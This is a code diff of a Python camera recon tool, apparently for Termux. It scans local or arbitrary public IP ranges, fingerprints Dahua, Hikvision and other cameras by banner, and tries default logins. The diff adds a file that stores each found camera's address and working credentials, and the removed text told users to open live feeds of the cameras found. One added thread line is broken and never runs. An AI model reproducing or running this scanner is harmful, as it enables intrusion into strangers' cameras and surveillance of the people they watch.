@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-Arman Advanced Multi-Mode Camera Scanner & Guide (Pro)
+Arman Ultimate Pro Camera Recon & Gateway Tool
 Author: Arman Yb
 GitHub: github.com/Armanyb1
 Telegram: @Armanyb
@@ -18,7 +18,6 @@ from datetime import datetime
 import time
 import sys
 import os
-import platform
 import uuid
 
 try:
@@ -42,6 +41,7 @@ socket.setdefaulttimeout(0.3)
 detected_ips = set()
 stop_scan = False
 scan_results = []
+PERSISTENT_FILE = "arman_live_cameras.txt"
 
 def get_hwid():
     device_id_path = "/data/data/com.termux/files/home/.device_id"
@@ -106,25 +106,43 @@ def verify_online_license():
 
 def print_banner():
     banner = f"""
-╔═══════════════════════════════════════════╗
-║   Arman Multi-Mode Camera Recon Tool      ║
-║   Local LAN, Public Scan & App Guide Pro  ║
-║   Telegram: @Armanyb                      ║
-╚═══════════════════════════════════════════╝
+╔═══════════════════════════════════════════════════╗
+║   Arman Ultimate Pro Camera Recon & Gateway Tool  ║
+║   Fast Discovery, Progress Bar & Deep Banner DB   ║
+║   Telegram: @Armanyb                              ║
+╚═══════════════════════════════════════════════════╝
 """
     print(f"{Fore.CYAN}{banner}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}[*] Developer: {Fore.YELLOW}Arman Yb{Style.RESET_ALL}\n")
 
-def get_local_ip_subnet():
+def get_router_brand(gateway_ip):
+    try:
+        res = requests.get(f"http://{gateway_ip}", timeout=1.5)
+        text = res.text.lower()
+        headers = str(res.headers).lower()
+        combined = text + headers
+        if "tp-link" in combined: return "TP-Link Router"
+        elif "tenda" in combined: return "Tenda Router"
+        elif "huawei" in combined: return "Huawei Router"
+        elif "d-link" in combined: return "D-Link Router"
+        elif "mikrotik" in combined: return "MikroTik Router"
+        elif "netgear" in combined: return "Netgear Router"
+        else: return f"Generic Router (Server: {res.headers.get('Server', 'Unknown')})"
+    except:
+        return "Gateway Active (Web UI Protected/Closed)"
+
+def get_local_ip_and_gateway():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         local_ip = s.getsockname()[0]
         s.close()
         subnet = ".".join(local_ip.split(".")[:3]) + "."
-        return local_ip, subnet
+        gateway_ip = subnet + "1"
+        router_info = get_router_brand(gateway_ip)
+        return local_ip, gateway_ip, subnet, router_info
     except:
-        return "192.168.1.100", "192.168.1."
+        return "192.168.1.100", "192.168.1.1", "192.168.1.", "Unknown Router"
 
 def check_default_credentials(url):
     common_credentials = [
@@ -147,6 +165,25 @@ def check_default_credentials(url):
             pass
     return "Protected / Unknown"
 
+def save_to_persistent_storage(res):
+    try:
+        existing_entries = set()
+        if os.path.exists(PERSISTENT_FILE):
+            with open(PERSISTENT_FILE, "r", encoding="utf-8") as f:
+                existing_entries = set(f.read().splitlines())
+                
+        entry_line = f"{res['ip']}:{res['port']} | {res['type']} | URL: {res['url']} | Auth: {res['creds']} | Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
+        
+        ip_check = f"{res['ip']}:{res['port']}"
+        is_duplicate = any(ip_check in line for line in existing_entries)
+        
+        if not is_duplicate:
+            with open(PERSISTENT_FILE, "a", encoding="utf-8") as f:
+                f.write(entry_line + "\n")
+            print(f"\n{Fore.CYAN}[💾 Saved to DB]: {entry_line}{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error saving to DB: {e}{Style.RESET_ALL}")
+
 def scan(ip, port):
     global stop_scan
     if stop_scan: return
@@ -160,15 +197,32 @@ def scan(ip, port):
             camera_found = False
             cam_type = "Unknown Camera"
             
-            if '<title>WEB SERVICE</title>' in response or 'Dahua' in response:
+            resp_lower = response.lower()
+            server_header = "Unknown"
+            for line in response.split('\r\n'):
+                if line.lower().startswith('server:'):
+                    server_header = line.split(':', 1)[1].strip()
+                    break
+
+            # Deep Banner Grabbing & Signature Checks
+            if 'goahead' in resp_lower or 'goahead-webs' in resp_lower:
                 camera_found = True
-                cam_type = "Dahua Camera"
-            elif 'login.asp' in response or 'Hikvision' in response:
+                cam_type = f"IP Camera (GoAhead Web Server - {server_header})"
+            elif 'app-webs' in resp_lower:
                 camera_found = True
-                cam_type = "Hikvision Camera"
-            elif 'login' in response.lower() or 'camera' in response.lower() or port in [554, 8000, 37777]:
+                cam_type = f"IP Camera (App-Webs - {server_header})"
+            elif 'dahua' in resp_lower:
                 camera_found = True
-                cam_type = "Generic IP Camera/Device"
+                cam_type = f"Dahua Camera ({server_header})"
+            elif 'hikvision' in resp_lower or 'hik-connect' in resp_lower:
+                camera_found = True
+                cam_type = f"Hikvision Camera ({server_header})"
+            elif 'boa' in resp_lower:
+                camera_found = True
+                cam_type = f"IP Camera (Boa Server - {server_header})"
+            elif 'login' in resp_lower or 'camera' in resp_lower or 'surveillance' in resp_lower or port in [554, 8000, 37777]:
+                camera_found = True
+                cam_type = f"Generic IP Camera/Device ({server_header})"
                 
             if camera_found and ip not in detected_ips:
                 detected_ips.add(ip)
@@ -182,133 +236,157 @@ def scan(ip, port):
                     "creds": creds
                 }
                 scan_results.append(result_item)
+                save_to_persistent_storage(result_item)
                 
-                print(f"\n{Fore.GREEN}[✓] Found: {cam_type} | IP: {ip}:{port} | Creds: {creds}{Style.RESET_ALL}")
+                print(f"\n{Fore.GREEN}[✓] Found Active Camera: {cam_type} | IP: {ip}:{port} | Creds: {creds}{Style.RESET_ALL}")
     except:
         pass
 
-def execute(queue):
-    global stop_scan
-    while not stop_scan:
+def is_host_alive(ip):
+    # Fast Host Discovery check on common ports
+    for p in [80, 443, 8080, 554, 8000, 37777]:
         try:
-            ip, port = queue.get(timeout=0.5)
-            scan(ip, port)
-            queue.task_done()
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(0.1)
+                if s.connect_ex((ip, p)) == 0:
+                    return True
         except:
-            if stop_scan: break
+            pass
+    return False
 
-def run_local_scanner():
+def get_ports_from_user():
+    print(f"\n{Fore.YELLOW}Select Port Options:{Style.RESET_ALL}")
+    print("1. Default Ports (80, 8080, 554, 8000, 37777)")
+    print("2. Enter Custom Ports (e.g. 80,554)")
+    choice = input(f"{Fore.GREEN}Choose port option (1-2): {Style.RESET_ALL}").strip()
+    
+    if choice == '2':
+        custom_input = input(f"{Fore.GREEN}Enter ports separated by comma (e.g. 80,8080,554): {Style.RESET_ALL}").strip()
+        try:
+            ports = [int(p.strip()) for p in custom_input.split(',')]
+            return ports
+        except:
+            print(f"{Fore.RED}[!] Invalid port format. Using default ports.{Style.RESET_ALL}")
+    
+    return [80, 8080, 554, 8000, 37777]
+
+def update_progress(completed, total):
+    percent = int((completed / total) * 100)
+    filled = int(percent / 10)
+    bar = '█' * filled + '░' * (10 - filled)
+    sys.stdout.write(f"\r{Fore.YELLOW}[{bar}] {percent}% Completed ({completed}/{total} IPs Checked){Style.RESET_ALL}")
+    sys.stdout.flush()
+
+def run_scanner_engine(subnet, ports_to_check):
     global stop_scan, scan_results
     stop_scan = False
     scan_results = []
     detected_ips.clear()
     
-    local_ip, subnet = get_local_ip_subnet()
-    print(f"{Fore.YELLOW}[i] Your Local IP: {local_ip}{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[i] Scanning Local Subnet: {subnet}1 to {subnet}254...{Style.RESET_ALL}\n")
+    print(f"\n{Fore.CYAN}[*] Step 1: Running Fast Host Discovery (Ping Check)...{Style.RESET_ALL}")
+    live_hosts = []
+    
+    for i in range(1, 255):
+        ip = f"{subnet}{i}"
+        if is_host_alive(ip):
+            live_hosts.append(ip)
+            
+    print(f"{Fore.GREEN}[✓] Host Discovery Completed! Active Hosts Found: {len(live_hosts)}{Style.RESET_ALL}\n")
+    print(f"{Fore.CYAN}[*] Step 2: Scanning Ports & Deep Banner Grabbing on Active Hosts...{Style.RESET_ALL}\n")
     
     queue = Queue()
     for _ in range(50):
-        threading.Thread(target=execute, args=(queue,), daemon=True).start()
+        t = threading.Thread(target=lambda q: [s for s in [q.get() and scan(s[0], s[1]) or q.task_done() for s in iter(q.get, None)]], daemon=True) # streamlined queue worker loop
         
-    ports_to_check = [80, 8080, 554, 8000, 37777]
-    for i in range(1, 255):
-        ip = f"{subnet}{i}"
+    # Better thread worker:
+    def worker(q):
+        global stop_scan
+        while not stop_scan:
+            try:
+                ip, port = q.get(timeout=0.5)
+                scan(ip, port)
+                q.task_done()
+            except:
+                if stop_scan: break
+
+    for _ in range(40):
+        threading.Thread(target=worker, args=(queue,), daemon=True).start()
+        
+    total_tasks = len(live_hosts) * len(ports_to_check)
+    completed_tasks = 0
+    
+    if total_tasks == 0:
+        print(f"{Fore.RED}[!] No active hosts to scan.{Style.RESET_ALL}")
+        return
+
+    for ip in live_hosts:
         for port in ports_to_check:
             queue.put((ip, port))
             
     while not queue.empty() and not stop_scan:
-        time.sleep(0.5)
+        done = total_tasks - queue.qsize()
+        update_progress(done, total_tasks)
+        time.sleep(0.3)
         
-    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}           LOCAL SCAN SUMMARY & DISCOVERED DEVICES           {Style.RESET_ALL}")
+    print("\n")
+    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}              SCAN COMPLETED & SAVED TO DB                   {Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
     
     if scan_results:
         for idx, res in enumerate(scan_results, 1):
-            print(f"{Fore.WHITE}[{idx}] Brand : {res['type']}")
+            print(f"{Fore.WHITE}[{idx}] Type : {res['type']}")
             print(f"    IP & Port : {res['ip']}:{res['port']}")
             print(f"    URL       : {res['url']}")
             print(f"    Auth/Pass : {res['creds']}")
             print(f"{'-'*60}")
     else:
-        print(f"{Fore.RED}[!] No cameras or devices found on this Wi-Fi network.{Style.RESET_ALL}")
+        print(f"{Fore.RED}[!] No cameras or devices found in this scan range.{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
 
-def run_public_scanner():
-    global stop_scan, scan_results
-    stop_scan = False
-    scan_results = []
-    detected_ips.clear()
+def run_local_scanner():
+    local_ip, gateway_ip, subnet, router_info = get_local_ip_and_gateway()
+    print(f"{Fore.YELLOW}[i] Your Local IP    : {local_ip}{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[i] Router Gateway   : {gateway_ip}{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[i] Router Brand Info: {router_info}{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[i] Scanning Subnet  : {subnet}1 to {subnet}254{Style.RESET_ALL}")
     
-    target_subnet = input(f"{Fore.GREEN}Enter Target IP Prefix or Subnet (e.g. 103.102.25): {Style.RESET_ALL}").strip()
+    ports_to_check = get_ports_from_user()
+    run_scanner_engine(subnet, ports_to_check)
+
+def run_public_scanner():
+    target_subnet = input(f"{Fore.GREEN}Enter Target Public Subnet Prefix (e.g. 103.102.25): {Style.RESET_ALL}").strip()
     if not target_subnet:
         target_subnet = "103.102.25"
         
-    print(f"{Fore.YELLOW}[i] Scanning Public Subnet: {target_subnet}.1 to {target_subnet}.254...{Style.RESET_ALL}\n")
-    
-    queue = Queue()
-    for _ in range(50):
-        threading.Thread(target=execute, args=(queue,), daemon=True).start()
-        
-    ports_to_check = [80, 8080, 8000, 37777]
-    for i in range(1, 255):
-        ip = f"{target_subnet}.{i}"
-        for port in ports_to_check:
-            queue.put((ip, port))
-            
-    while not queue.empty() and not stop_scan:
-        time.sleep(0.5)
-        
+    ports_to_check = get_ports_from_user()
+    print(f"{Fore.YELLOW}[i] Scanning Public Subnet: {target_subnet}.1 to {target_subnet}.254{Style.RESET_ALL}")
+    run_scanner_engine(target_subnet + ".", ports_to_check)
+
+def view_saved_database():
     print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}          PUBLIC SCAN SUMMARY & DISCOVERED CAMERAS           {Style.RESET_ALL}")
+    print(f"{Fore.GREEN}        SAVED CAMERAS & CREDENTIALS DATABASE (DB)            {Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-    
-    if scan_results:
-        for idx, res in enumerate(scan_results, 1):
-            print(f"{Fore.WHITE}[{idx}] Brand : {res['type']}")
-            print(f"    IP & Port : {res['ip']}:{res['port']}")
-            print(f"    URL       : {res['url']}")
-            print(f"    Auth/Pass : {res['creds']}")
-            print(f"{'-'*60}")
+    if os.path.exists(PERSISTENT_FILE):
+        with open(PERSISTENT_FILE, "r", encoding="utf-8") as f:
+            lines = f.read().splitlines()
+            if lines:
+                for idx, line in enumerate(lines, 1):
+                    print(f"{Fore.WHITE}[{idx}] {line}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}[!] Database file is empty.{Style.RESET_ALL}")
     else:
-        print(f"{Fore.RED}[!] No cameras found in this range.{Style.RESET_ALL}")
+        print(f"{Fore.RED}[!] No saved database found yet. Run a scan first!{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
-
-def show_app_guide():
-    guide_text = f"""
-{Fore.CYAN}============================================================
-           CAMERA LOGIN & MOBILE APP GUIDE (REFERENCE)
-============================================================
-{Fore.YELLOW}1. Hikvision Cameras:
-   - Mobile Apps: Hik-Connect, iVMS-4500, Guarding Vision
-   - PC Software: iVMS-4200
-   - Default Port: 80, 8000
-
-{Fore.YELLOW}2. Dahua Cameras:
-   - Mobile Apps: DMSS, gDMSS Plus, IDMSS
-   - PC Software: SmartPSS
-   - Default Port: 80, 37777
-
-{Fore.YELLOW}3. Generic / Other IP Cameras:
-   - Mobile Apps: IP Cam Viewer, VLC Media Player (Network Stream)
-   - PC Software: VLC, Onvif Device Manager
-   - Default Port: 554 (RTSP), 8080
-
-{Fore.WHITE}Tip: Copy the discovered IP:Port and paste it into the 
-corresponding app or browser to view the live camera feed!
-{Fore.CYAN}============================================================{Style.RESET_ALL}
-"""
-    print(guide_text)
 
 def main():
     verify_online_license()
     print_banner()
     while True:
         print(f"\n{Fore.CYAN}=== MAIN MENU ===")
-        print("1. Scan Current Local Wi-Fi (LAN)")
-        print("2. Scan Public / ISP IP Range")
-        print("3. View Camera Login App Guide")
+        print("1. Scan Local Wi-Fi (LAN) + Gateway Brand + Fast Ping + Progress Bar")
+        print("2. Scan Public / ISP Subnet Range + Fast Ping + Progress Bar")
+        print("3. View Saved Cameras Database (arman_live_cameras.txt)")
         print(f"4. Exit{Style.RESET_ALL}")
         
         choice = input(f"{Fore.GREEN}Select option (1-4): {Style.RESET_ALL}").strip()
@@ -317,7 +395,7 @@ def main():
         elif choice == '2':
             run_public_scanner()
         elif choice == '3':
-            show_app_guide()
+            view_saved_database()
         elif choice == '4':
             print(f"{Fore.YELLOW}[*] Exiting tool. Goodbye, Arman!{Style.RESET_ALL}")
             break
